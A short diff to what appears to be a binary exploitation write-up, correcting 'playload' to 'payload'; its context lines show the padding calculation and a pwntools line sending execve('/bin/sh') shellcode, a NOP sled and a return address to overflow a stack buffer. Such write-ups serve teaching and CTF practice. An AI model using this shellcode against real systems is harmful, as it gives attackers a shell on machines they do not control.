@@ -49,7 +49,7 @@ And calculate our padding:
     
 We can see we read to `rbp - 0x70` so our total padding will be 0x78 bytes. Thus, our padding will be 0x78 - 0x1b (27) = 0x5d
   
-Third, which will be our final playload, with a padding of:
+Third, which will be our final payload, with a padding of:
 
   ```python
   p.sendline( b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + b"\x90"*0x5d + p64(addr))
